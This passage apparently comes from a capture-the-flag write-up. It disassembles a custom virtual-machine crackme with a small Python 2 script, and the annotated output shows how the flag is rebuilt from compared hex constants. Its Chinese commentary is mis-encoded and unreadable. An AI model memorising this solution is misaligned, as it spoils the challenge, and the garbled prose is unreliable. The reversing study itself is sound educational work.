class="number">51</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">77</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">11</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">84</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">85</span>, <span class="number">64</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">51</span>, <span class="number">180</span>, <span class="number">136</span>, <span class="number">172</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">74</span>, <span class="number">11</span>, <span class="number">148</span>, <span class="number">63</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">124</span>, <span class="number">92</span>, <span class="number">220</span>, <span class="number">236</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">41</span>, <span class="number">117</span>, <span class="number">27</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">30</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">131</span>, <span class="number">141</span>, <span class="number">181</span>, <span class="number">46</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">2</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>]</span><br><span class="line"></span><br><span class="line">opcodes = &#123;</span><br><span class="line">  <span class="number">67</span>: (<span class="string">"return result"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">68</span>: (<span class="string">"j_flag_neg1"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">69</span>: (<span class="string">"mod_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">70</span>: (<span class="string">"load_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">71</span>: (<span class="string">"xor_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">72</span>: (<span class="string">"cmp_hi_to_lo"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">73</span>: (<span class="string">"inc_mem_ptr"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">74</span>: (<span class="string">"and_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">75</span>: (<span class="string">"j_not_flag"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">76</span>: (<span class="string">"xor_block"</span>, <span class="number">16</span>),</span><br><span class="line">  <span class="number">77</span>: (<span class="string">"j_flag_1"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">78</span>: (<span class="string">"dec_assign_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">79</span>: (<span class="string">"push"</span>, <span class="number">5</span>),</span><br><span class="line">  <span class="number">80</span>: (<span class="string">"inc_assign_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">81</span>: (<span class="string">"assign_lo_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">82</span>: (<span class="string">"push hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">83</span>: (<span class="string">"add_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">84</span>: (<span class="string">"pop hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">85</span>: (<span class="string">"jmp_bck_cnt"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">86</span>: (<span class="string">"dec_mem_ptr"</span>, <span class="number">1</span>),</span><br><span class="line">  <span class="number">87</span>: (<span class="string">"store hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">88</span>: (<span class="string">"mul_to_hi"</span>, <span class="number">2</span>),</span><br><span class="line">  <span class="number">89</span>: (<span class="string">"subs_to_hi"</span>, <span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pc != len(code):</span><br><span class="line">  opcode = code[pc]</span><br><span class="line">  name = opcodes[opcode][<span class="number">0</span>]</span><br><span class="line">  length = opcodes[opcode][<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%03x\t"</span> % pc, </span><br><span class="line">  <span class="keyword">print</span> name, </span><br><span class="line">  <span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    pc += <span class="number">1</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hi'</span> <span class="keyword">in</span> name:</span><br><span class="line">      <span class="keyword">print</span> code[pc+<span class="number">1</span>] &gt;&gt; <span class="number">4</span>, code[pc+<span class="number">1</span>] &amp; <span class="number">0xf</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">print</span> hex(code[pc+<span class="number">1</span>])</span><br><span class="line">    pc += <span class="number">2</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">5</span>:</span><br><span class="line">    num = (code[pc+<span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | (code[pc+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (code[pc+<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | (code[pc+<span class="number">4</span>] &lt;&lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(num)</span><br><span class="line">    pc += <span class="number">5</span></span><br><span class="line">  <span class="keyword">elif</span> length == <span class="number">16</span>:</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">      code[i + pc + <span class="number">1</span>] ^= <span class="number">0x66</span></span><br><span class="line">    pc += <span class="number">16</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼ˆè¾“å‡ºä¸­æ³¨é‡Šæ˜¯åˆ†æè¿‡ç¨‹ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">000 push 0x2f</span><br><span class="line">005 jmp_bck_cnt 0x5</span><br><span class="line">007 pop hi 3 0</span><br><span class="line">009 load_to_hi 0 0</span><br><span class="line">00b xor_to_hi 2 2</span><br><span class="line">00d cmp_hi_to_lo 0 2</span><br><span class="line">00f j_not_flag 0x33 =&gt; 0x44</span><br><span class="line">011 inc_mem_ptr</span><br><span class="line">012 push 0x46</span><br><span class="line">017 pop hi 1 0</span><br><span class="line">019 cmp_hi_to_lo 0 1</span><br><span class="line">01b j_flag_1 0x27 =&gt; 0x44</span><br><span class="line">01d push 0x30</span><br><span class="line">022 pop hi 1 0</span><br><span class="line">024 cmp_hi_to_lo 0 1</span><br><span class="line">026 j_flag_neg1 0x16 =&gt; 0x3e</span><br><span class="line">028 push 0x39</span><br><span class="line">02d pop hi 1 0</span><br><span class="line">02f cmp_hi_to_lo 0 1</span><br><span class="line">031 j_flag_neg1 0xb =&gt; 0x3e</span><br><span class="line">033 push 0x41</span><br><span class="line">038 pop hi 0 1</span><br><span class="line">03a cmp_hi_to_lo 0 1</span><br><span class="line">03c j_flag_neg1 0x6 =&gt; 0x44</span><br><span class="line">03e xor_to_hi 0 0</span><br><span class="line">040 cmp_hi_to_lo 0 0</span><br><span class="line">042 j_not_flag 0x5 =&gt; 0x49</span><br><span class="line">fail:</span><br><span class="line">044 xor_to_hi 0 0</span><br><span class="line">046 inc_assign_hi 0 0</span><br><span class="line">048 return result</span><br><span class="line">049 jmp_bck_cnt 0x40</span><br><span class="line">(check hex digits)</span><br><span class="line"></span><br><span class="line">04b push 0x7        </span><br><span class="line">050 pop hi 3 0      // cnt = 0x7</span><br><span class="line">052 xor_to_hi 1 1   // reg[1] = 0</span><br><span class="line">back:</span><br><span class="line">054 dec_mem_ptr</span><br><span class="line">055 load_to_hi 0 0  // reg[0] = c</span><br><span class="line">057 push 0x30</span><br><span class="line">05c pop hi 2 0      // reg[2] = 0x30</span><br><span class="line">05e subs_to_hi 0 2  // c-=0x30</span><br><span class="line">060 push 0xa</span><br><span class="line">065 pop hi 2 0      // reg[2] = 10</span><br><span class="line">067 cmp_hi_to_lo 0 2</span><br><span class="line">069 j_flag_neg1 0x9 // c &lt; 10 =&gt; less_than_10</span><br><span class="line">06b push 0x7</span><br><span class="line">070 pop hi 2 0      // reg[2] = 7</span><br><span class="line">072 subs_to_hi 0 2  // c-=7</span><br><span class="line">less_than_10:</span><br><span class="line">074 push 0x10</span><br><span class="line">079 pop hi 2 0</span><br><span class="line">07b mul_to_hi 1 2   i &lt;&lt; 4</span><br><span class="line">07d add_to_hi 1 0   i += c</span><br><span class="line">07f jmp_bck_cnt 0x2b =&gt; back</span><br><span class="line">081 push 0x33b488ac</span><br><span class="line">086 pop hi 2 0</span><br><span class="line">088 cmp_hi_to_lo 1 2</span><br><span class="line">08a xor_to_hi 0 0</span><br><span class="line">08c j_not_flag 0x3</span><br><span class="line">08e inc_assign_hi 0 0</span><br><span class="line">090 return result</span><br><span class="line">(åä¸ƒä¸ªå­—ç¬¦ä¸º &quot;33b488ac&quot;[::-1])</span><br><span class="line"></span><br><span class="line">091 push 0x7</span><br><span class="line">096 pop hi 3 0</span><br><span class="line">098 xor_to_hi 1 1</span><br><span class="line">09a dec_mem_ptr</span><br><span class="line">09b load_to_hi 0 0</span><br><span class="line">09d push 0x30</span><br><span class="line">0a2 pop hi 2 0</span><br><span class="line">0a4 subs_to_hi 0 2</span><br><span class="line">0a6 push 0xa</span><br><span class="line">0ab pop hi 2 0</span><br><span class="line">0ad cmp_hi_to_lo 0 2</span><br><span class="line">0af j_flag_neg1 0x9</span><br><span class="line">0b1 push 0x7</span><br><span class="line">0b6 pop hi 2 0</span><br><span class="line">0b8 subs_to_hi 0 2</span><br><span class="line">0ba push 0x10</span><br><span class="line">0bf pop hi 2 0</span><br><span class="line">0c1 mul_to_hi 1 2</span><br><span class="line">0c3 add_to_hi 1 0</span><br><span class="line">0c5 jmp_bck_cnt 0x2b</span><br><span class="line">0c7 push 0x4a0b943f</span><br><span class="line">0cc pop hi 2 0</span><br><span class="line">0ce cmp_hi_to_lo 1 2</span><br><span class="line">0d0 xor_to_hi 0 0</span><br><span class="line">0d2 j_not_flag 0x3</span><br><span class="line">0d4 inc_assign_hi 0 0</span><br><span class="line">0d6 return result</span><br><span class="line">0d7 push 0x7</span><br><span class="line">0dc pop hi 3 0</span><br><span class="line">0de xor_to_hi 1 1</span><br><span class="line">0e0 dec_mem_ptr</span><br><span class="line">0e1 load_to_hi 0 0</span><br><span class="line">0e3 push 0x30</span><br><span class="line">0e8 pop hi 2 0</span><br><span class="line">0ea subs_to_hi 0 2</span><br><span class="line">0ec push 0xa</span><br><span class="line">0f1 pop hi 2 0</span><br><span class="line">0f3 cmp_hi_to_lo 0 2</span><br><span class="line">0f5 j_flag_neg1 0x9</span><br><span class="line">0f7 push 0x7</span><br><span class="line">0fc pop hi 2 0</span><br><span class="line">0fe subs_to_hi 0 2</span><br><span class="line">100 push 0x10</span><br><span class="line">105 pop hi 2 0</span><br><span class="line">107 mul_to_hi 1 2</span><br><span class="line">109 add_to_hi 1 0</span><br><span class="line">10b jmp_bck_cnt 0x2b</span><br><span class="line">10d push 0x7c5cdcec</span><br><span class="line">112 pop hi 2 0</span><br><span class="line">114 cmp_hi_to_lo 1 2</span><br><span class="line">116 xor_to_hi 0 0</span><br><span class="line">118 j_not_flag 0x3</span><br><span class="line">11a inc_assign_hi 0 0</span><br><span class="line">11c return result</span><br><span class="line">11d push 0x7</span><br><span class="line">122 pop hi 3 0</span><br><span class="line">124 xor_to_hi 1 1</span><br><span class="line">126 dec_mem_ptr</span><br><span class="line">127 load_to_hi 0 0</span><br><span class="line">129 push 0x30</span><br><span class="line">12e pop hi 2 0</span><br><span class="line">130 subs_to_hi 0 2</span><br><span class="line">132 push 0xa</span><br><span class="line">137 pop hi 2 0</span><br><span class="line">139 cmp_hi_to_lo 0 2</span><br><span class="line">13b j_flag_neg1 0x9</span><br><span class="line">13d push 0x7</span><br><span class="line">142 pop hi 2 0</span><br><span class="line">144 subs_to_hi 0 2</span><br><span class="line">146 push 0x10</span><br><span class="line">14b pop hi 2 0</span><br><span class="line">14d mul_to_hi 1 2</span><br><span class="line">14f add_to_hi 1 0</span><br><span class="line">151 jmp_bck_cnt 0x2b</span><br><span class="line">153 push 0x3929751b</span><br><span class="line">158 pop hi 2 0</span><br><span class="line">15a cmp_hi_to_lo 1 2</span><br><span class="line">15c xor_to_hi 0 0</span><br><span class="line">15e j_not_flag 0x3</span><br><span class="line">160 inc_assign_hi 0 0</span><br><span class="line">162 return result</span><br><span class="line">163 push 0x7</span><br><span class="line">168 pop hi 3 0</span><br><span class="line">16a xor_to_hi 1 1</span><br><span class="line">16c dec_mem_ptr</span><br><span class="line">16d load_to_hi 0 0</span><br><span class="line">16f push 0x30</span><br><span class="line">174 pop hi 2 0</span><br><span class="line">176 subs_to_hi 0 2</span><br><span class="line">178 push 0xa</span><br><span class="line">17d pop hi 2 0</span><br><span class="line">17f cmp_hi_to_lo 0 2</span><br><span class="line">181 j_flag_neg1 0x9</span><br><span class="line">183 push 0x7</span><br><span class="line">188 pop hi 2 0</span><br><span class="line">18a subs_to_hi 0 2</span><br><span class="line">18c push 0x10</span><br><span class="line">191 pop hi 2 0</span><br><span class="line">193 mul_to_hi 1 2</span><br><span class="line">195 add_to_hi 1 0</span><br><span class="line">197 jmp_bck_cnt 0x2b</span><br><span class="line">199 push 0x1ef26b2d</span><br><span class="line">19e pop hi 2 0</span><br><span class="line">1a0 cmp_hi_to_lo 1 2</span><br><span class="line">1a2 xor_to_hi 0 0</span><br><span class="line">1a4 j_not_flag 0x3</span><br><span class="line">1a6 inc_assign_hi 0 0</span><br><span class="line">1a8 return result</span><br><span class="line">1a9 push 0x7</span><br><span class="line">1ae pop hi 3 0</span><br><span class="line">1b0 xor_to_hi 1 1</span><br><span class="line">1b2 dec_mem_ptr</span><br><span class="line">1b3 load_to_hi 0 0</span><br><span class="line">1b5 push 0x30</span><br><span class="line">1ba pop hi 2 0</span><br><span class="line">1bc subs_to_hi 0 2</span><br><span class="line">1be push 0xa</span><br><span class="line">1c3 pop hi 2 0</span><br><span class="line">1c5 cmp_hi_to_lo 0 2</span><br><span class="line">1c7 j_flag_neg1 0x9</span><br><span class="line">1c9 push 0x7</span><br><span class="line">1ce pop hi 2 0</span><br><span class="line">1d0 subs_to_hi 0 2</span><br><span class="line">1d2 push 0x10</span><br><span class="line">1d7 pop hi 2 0</span><br><span class="line">1d9 mul_to_hi 1 2</span><br><span class="line">1db add_to_hi 1 0</span><br><span class="line">1dd jmp_bck_cnt 0x2b</span><br><span class="line">1df push 0x838db52e</span><br><span class="line">1e4 pop hi 2 0</span><br><span class="line">1e6 cmp_hi_to_lo 1 2</span><br><span class="line">1e8 xor_to_hi 0 0</span><br><span class="line">1ea j_not_flag 0x2</span><br><span class="line">1ec inc_assign_hi 0 0</span><br><span class="line">1ee return result</span><br></pre></td></tr></table></figure><p>åˆ†æåˆ°090è§‚å¯Ÿåˆ°ä¸‹é¢éƒ½æ˜¯ç±»ä¼¼çš„ä»£ç ç»“æ„ï¼Œä¹‹åç›´æ¥è¿˜åŸflagå°±å¯ä»¥äº†ï¼Œåªéœ€è¦æŠŠæ¯”è¾ƒçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²æŒ‰ç«¯åºä»åå¾€å‰æ‹¼æ¥èµ·æ¥å¾—åˆ°flagã€‚</p><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://laucyun.com/3411bc6f400207178b85defa04474b4a.html" target="_blank" rel="noopener">https://laucyun.com/3411bc6f400207178b85defa04474b4a.html</a><br><a href="https://spaces.ac.cn/archives/1907" target="_blank" rel="noopener">https://spaces.ac.cn/archives/1907</a><br><a href="https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double" target="_blank" rel="noopener">https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double</a><br><a href="https://xz.aliyun.com/t/2897" 